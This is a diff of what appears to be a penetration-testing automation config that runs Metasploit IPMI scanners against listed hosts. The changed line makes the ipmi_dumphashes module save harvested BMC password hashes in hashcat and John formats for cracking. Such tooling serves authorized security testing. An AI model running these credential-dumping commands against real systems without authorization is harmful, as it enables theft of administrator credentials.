@@ -51,7 +51,7 @@ windows:
         - IPMI Cipher Zero:
           - tmux select-pane -T 'IPMI Cipher Zero' -t "unauthd:services.3"
           - cat <%= @settings["rootDir"] %>/scans/Lists/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/Lists/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_version.txt; run; spool off; exit'
-          - cat <%= @settings["rootDir"] %>/scans/Lists/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/Lists/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_dumphashes.txt; run; spool off; exit'
+          - cat <%= @settings["rootDir"] %>/scans/Lists/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set OUTPUT_HASHCAT_FILE /<%= @settings["rootDir"] %>/scans/Lists/ipmiHashes.hashcat; set OUTPUT_JOHN_FILE /<%= @settings["rootDir"] %>/scans/Lists/ipmiHashes.john; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/Lists/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_dumphashes.txt; run; spool off; exit'
           - cat <%= @settings["rootDir"] %>/scans/Lists/ipmi.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS file:/<%= @settings["rootDir"] %>/scans/Lists/ipmi.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_cipher_zero.txt; run; spool off; exit'
           - wc -l <%= @settings["rootDir"] %>/scans/ipmi*
         - printers:
